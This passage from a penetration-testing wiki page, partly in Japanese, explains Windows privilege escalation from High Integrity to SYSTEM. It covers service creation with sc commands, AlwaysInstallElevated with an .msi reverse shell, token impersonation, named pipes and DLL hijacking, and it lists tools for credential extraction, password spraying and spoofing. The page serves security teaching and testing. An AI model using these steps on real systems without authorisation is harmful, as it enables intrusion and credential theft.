[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **pass to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

**ハイインテグリティプロセスから、AlwaysInstallElevatedレジストリエントリを有効にして、.msiラッパーを使用して逆シェルをインストール**することができます。\
[関連するレジストリキーと.msiパッケージのインストール方法についての詳細はこちら。](./#alwaysinstallelevated)

### High + SeImpersonate権限をSystemに

**[こちらでコードを見つけることができます](seimpersonate-from-high-to-system.md)**。

### SeDebug + SeImpersonateからFull Token権限へ

これらのトークン権限を持っている場合（おそらくすでにHigh Integrityプロセスで見つけることができるでしょう）、SeDebug権限を持たないプロセスを除いて、ほとんどのプロセスを開くことができ、プロセスのトークンをコピーし、そのトークンで任意のプロセスを作成することができます。\
このテクニックを使用すると、通常はすべてのトークン権限を持つSYSTEMとして実行されているプロセスが選択されます（はい、すべてのトークン権限を持たないSYSTEMプロセスを見つけることができます）。\
[提案されたテクニックを実行するコードの例はこちらで見つけることができます](sedebug-+-seimpersonate-copy-token.md)**。**

### Named Pipes

このテクニックは、`getsystem`でエスカレーションするためにmeterpreterによって使用されます。このテクニックは、**パイプを作成し、そのパイプに書き込むためにサービスを作成/悪用する**ことで構成されます。その後、**SeImpersonate**権限を使用してパイプクライアント（サービス）のトークンを**偽装**することができる**サーバー**は、SYSTEM権限を取得します。\
[名前付きパイプについて詳しく学びたい場合は、こちらを読んでください](./#named-pipe-client-impersonation)。\
[高インテグリティからSystemに移行する方法の例については、こちらを読んでください](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM**で実行されている**プロセス**によって**ロード**されている**dllをハイジャック**することができれば、その権限で任意のコードを実行することができます。したがって、Dll Hijackingはこの種の特権昇格にも役立ちます。さらに、ハイインテグリティプロセスからは、dllをロードするために使用されるフォルダに**書き込み権限**があるため、**はるかに簡単に達成**することができます。\
[Dllハイジャックについて詳しくはこちらを参照してください](dll-hijacking/)。

### 管理者またはネットワークサービスからSystemへ

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICEまたはNETWORK SERVICEからフル権限へ

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## その他のヘルプ

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windowsローカル特権昇格ベクターを探すための最高のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスと機密ファイルをチェック（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出されました。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な設定ミスをチェックし、情報を収集（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、およびRDPの保存されたセッション情報を抽出します。ローカルで -Thorough を使用します。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 資格情報をCredential Managerから抽出します。検出されました。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体にスプレーします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell ADIDNS/LLMNR/mDNS/NBNSスプーファーおよび中間者ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な特権昇格Windows列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 既知の特権昇格脆弱性を検索（Watsonのために非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（管理者権限が必要）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の特権昇格脆弱性を検索（VisualStudioを使用してコンパイルする必要があります）（[**事前コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙し、設定ミスを検索します（特権昇格よりも情報収集ツール）（コンパイルが必要） **（**[**事前コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（githubに事前コンパイルされたexeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#ポート**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 設定ミスをチェック（githubに事前コンパイルされた実行可能ファイルがあります）。お勧めしません。Win10ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な設定ミスをチェック（pythonからのexe）。お勧めしません。Win10ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿を基に作成されたツール（適切に機能させるためにaccesschkは必要ありませんが、使用することができます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するエクスプロイトを推奨します（ローカルpython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するエクスプロイトを推奨します（ローカルpython）

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

プロジェクトを正しい.NETのバージョンを使用してコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストでインストールされている.NETのバージョンを確認するには、次の操作を行います：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考文献

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**してみたいですか？または、**最新バージョンのPEASSにアクセス**したいですか？または、HackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つけてください
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[Telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングトリックを共有するために、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
